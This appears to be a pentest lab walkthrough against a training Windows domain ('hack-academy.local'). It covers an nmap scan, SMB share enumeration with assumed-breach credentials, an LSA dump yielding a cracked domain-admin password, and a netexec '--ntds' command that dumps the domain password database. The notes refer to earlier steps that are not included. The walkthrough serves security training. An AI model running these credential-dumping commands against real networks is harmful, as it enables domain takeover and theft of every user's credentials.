
# NMAP

```
└─$ sudo nmap -sC -sV -p- -Pn 10.0.2.9 --max-retries=1
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-23 20:18 EDT
Nmap scan report for 10.0.2.9
Host is up (0.00044s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HACK-ACADEMY
|   NetBIOS_Domain_Name: HACK-ACADEMY
|   NetBIOS_Computer_Name: CLIENT-2
|   DNS_Domain_Name: hack-academy.local
|   DNS_Computer_Name: Client-2.hack-academy.local
|   DNS_Tree_Name: hack-academy.local
|   Product_Version: 10.0.19041
|_  System_Time: 2026-07-24T00:21:41+00:00
|_ssl-date: 2026-07-24T00:22:21+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Client-2.hack-academy.local
| Not valid before: 2026-07-23T01:31:01
|_Not valid after:  2027-01-22T01:31:01
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:6C:31:CF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CLIENT-2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:6c:31:cf (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-24T00:21:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.60 seconds
```

# SMB

Tried to connect with smbclient but no null session

```
┌──(xmen㉿kali)-[~]
└─$ smbclient -N -L ////client-2.hack-academy.local
session setup failed: NT_STATUS_ACCESS_DENIED
```

Using assumed breach credentials:

```
┌──(xmen㉿kali)-[~]
└─$ smbclient ////client-2.hack-academy.local -U 'hack-academy.local/lbennett%!!reiD123'
do_connect: Connection to  failed (Error NT_STATUS_NOT_FOUND)
```

# SMB as twest

```
┌──(xmen㉿kali)-[~/bloodhound]
└─$ nxc smb client-2.hack-academy.local -u 'twest' -p 'HappyCactus$10' --shares
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)                                                              
SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\twest:HappyCactus$10 
SMB         10.0.2.9        445    CLIENT-2         [*] Enumerated shares
SMB         10.0.2.9        445    CLIENT-2         Share           Permissions     Remark                                                                
SMB         10.0.2.9        445    CLIENT-2         -----           -----------     ------                                                                
SMB         10.0.2.9        445    CLIENT-2         ADMIN$                          Remote Admin                                                          
SMB         10.0.2.9        445    CLIENT-2         C$                              Default share                                                         
SMB         10.0.2.9        445    CLIENT-2         IPC$            READ            Remote IPC    
```

Nothing too useful here

# EKNight

As the eknight user, we can dump lsa again via netexec and this gets us a hash cached for mthompson, which we can crack via john. This is also the domain admin user we found earlier in bloodhound

```
Password123!!
```

From here we can auth and use netexec to do a dump of the NTDS.dit (DCSync type attack)

```
netexec smb 10.0.2.4 -u 'mthompson' -p 'Password123!!' --ntds
```


